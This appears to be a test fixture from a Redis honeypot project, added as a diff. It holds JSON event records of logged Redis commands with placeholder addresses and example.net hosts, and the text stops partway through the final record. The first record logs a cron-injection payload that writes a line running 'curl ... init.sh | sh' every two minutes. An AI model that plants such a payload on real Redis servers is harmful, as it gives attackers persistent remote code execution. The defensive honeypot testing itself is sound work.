@@ -1,0 +1,1947 @@
+{
+  "redishoneypot": [
+    {
+      "metadata": {
+        "analysis_hint": "cron_payload",
+        "arg_count": "2",
+        "args_sha256": "901b6b60c2147cd1a276ae0b7a74b4ae322a1f5034d24af32982991575ff15ab",
+        "args_text": "backup1 \n\n*/2 * * * * curl -fsSL http://redishoneypot-test-1793376864-45995.example.net/init.sh | sh\n\n",
+        "args_truncated": "False",
+        "client_id": "2",
+        "close_after_command": "False",
+        "command": "SET",
+        "command_category": "write",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "ioc_count": "2",
+        "ioc_domains": "redishoneypot-test-1793376864-45995.example.net",
+        "ioc_urls": "http://redishoneypot-test-1793376864-45995.example.net/init.sh",
+        "key": "backup1",
+        "key_count": "1",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "5",
+        "response_class": "simple_string",
+        "session_duration": "0.000753858",
+        "session_duration_ms": "0",
+        "session_id": "5c117c2402afe738276386c0593449c8",
+        "session_start": "2026-10-30T16:14:24.529066928Z",
+        "uuid": "00000000-0000-4000-8000-000000000001",
+        "value_sha256": "ba89a4a7a9aab207a347e3a1d48447aa3e8b0158f5e8539528131367bd02ba41",
+        "value_size": "94",
+        "value_text": "\n\n*/2 * * * * curl -fsSL http://redishoneypot-test-1793376864-45995.example.net/init.sh | sh\n\n",
+        "value_truncated": "False"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "SET backup1 \n\n*/2 * * * * curl -fsSL http://redishoneypot-test-1793376864-45995.example.net/init.sh | sh\n\n"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43416",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "analysis_hint": "redis_client",
+        "arg_count": "2",
+        "args_sha256": "a137c8d5d335c89d6e086a5555dab3a802aed93b59730c39cd14eb2018fb729b",
+        "args_text": "SETNAME nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn",
+        "args_truncated": "False",
+        "client_id": "2",
+        "client_name": "nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn",
+        "client_name_truncated": "True",
+        "client_subcommand": "setname",
+        "close_after_command": "False",
+        "command": "CLIENT",
+        "command_category": "recon",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "5",
+        "response_class": "simple_string",
+        "session_duration": "0.001003395",
+        "session_duration_ms": "1",
+        "session_id": "5c117c2402afe738276386c0593449c8",
+        "session_start": "2026-10-30T16:14:24.529066928Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "CLIENT SETNAME nnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43416",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "analysis_hint": "redis_get",
+        "arg_count": "1",
+        "args_sha256": "dd56a80d8b51c93d232bd3e45c7c1bf2df6c1e7bda881e11aa3d58996f433066",
+        "args_text": "redishoneypot-smoke-key-redishoneypot-test-1793376864-45995",
+        "args_truncated": "False",
+        "client_id": "2",
+        "close_after_command": "False",
+        "command": "GET",
+        "command_category": "read",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "key": "redishoneypot-smoke-key-redishoneypot-test-1793376864-45995",
+        "key_count": "1",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "42",
+        "response_class": "bulk_string",
+        "session_duration": "0.000473009",
+        "session_duration_ms": "0",
+        "session_id": "5c117c2402afe738276386c0593449c8",
+        "session_start": "2026-10-30T16:14:24.529066928Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "GET redishoneypot-smoke-key-redishoneypot-test-1793376864-45995"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43416",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "analysis_hint": "redis_lua_eval",
+        "arg_count": "2",
+        "args_sha256": "3f24d75dde372b231bbf3167c2944bfe3fc37d313feeec2f0e9180e22d378b1c",
+        "args_text": "return 1 0",
+        "args_truncated": "False",
+        "client_id": "2",
+        "close_after_command": "False",
+        "command": "EVAL",
+        "command_category": "scripting",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "4",
+        "response_class": "integer",
+        "script_numkeys": "0",
+        "script_sha1": "e0e1f9fabfc9d4800c877a703b823ac0578ff8db",
+        "script_sha256": "486d9affb60dbb0063b03d8e23a6ccf6364ce203dc3a9f56f20e750eb41ecade",
+        "script_size": "8",
+        "script_text": "return 1",
+        "script_truncated": "False",
+        "session_duration": "0.000920618",
+        "session_duration_ms": "0",
+        "session_id": "5c117c2402afe738276386c0593449c8",
+        "session_start": "2026-10-30T16:14:24.529066928Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "EVAL return 1 0"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43416",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "analysis_hint": "redis_set",
+        "arg_count": "2",
+        "args_sha256": "432dbce66ec1cd581d920c70e089b96f502ad85bcf34638e230de14c2d6de81d",
+        "args_text": "ews-example xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+        "args_truncated": "True",
+        "client_id": "1",
+        "close_after_command": "False",
+        "command": "SET",
+        "command_category": "write",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "key": "ews-example",
+        "key_count": "1",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "5",
+        "response_class": "simple_string",
+        "session_duration": "0.000105584",
+        "session_duration_ms": "0",
+        "session_id": "9d513d21ab995c1f73fe02e542b4a1aa",
+        "session_start": "2026-10-30T16:17:32.94147143Z",
+        "uuid": "00000000-0000-4000-8000-000000000001",
+        "value_sha256": "b651da7f4a71996a6a796178af23884577279f6b5f2038a2c279f21de70b622a",
+        "value_size": "8300",
+        "value_text": "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
+        "value_truncated": "True"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "SET ews-example xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "39498",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:17:32",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "analysis_hint": "redis_set",
+        "arg_count": "2",
+        "args_sha256": "535f3f83113b420f3d89ef60c056dc62e089c5c6b68c4bb67ea88919a45375b8",
+        "args_text": "redishoneypot-smoke-key-redishoneypot-test-1793376864-45995 redishoneypot-test-1793376864-45995",
+        "args_truncated": "False",
+        "client_id": "2",
+        "close_after_command": "False",
+        "command": "SET",
+        "command_category": "write",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "key": "redishoneypot-smoke-key-redishoneypot-test-1793376864-45995",
+        "key_count": "1",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "5",
+        "response_class": "simple_string",
+        "session_duration": "0.000370371",
+        "session_duration_ms": "0",
+        "session_id": "5c117c2402afe738276386c0593449c8",
+        "session_start": "2026-10-30T16:14:24.529066928Z",
+        "uuid": "00000000-0000-4000-8000-000000000001",
+        "value_sha256": "d91be6eee5e2a69d7abfa158d94e5450b2bc4edddf8f76cf6942c779f5894c67",
+        "value_size": "35",
+        "value_text": "redishoneypot-test-1793376864-45995",
+        "value_truncated": "False"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "SET redishoneypot-smoke-key-redishoneypot-test-1793376864-45995 redishoneypot-test-1793376864-45995"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43416",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
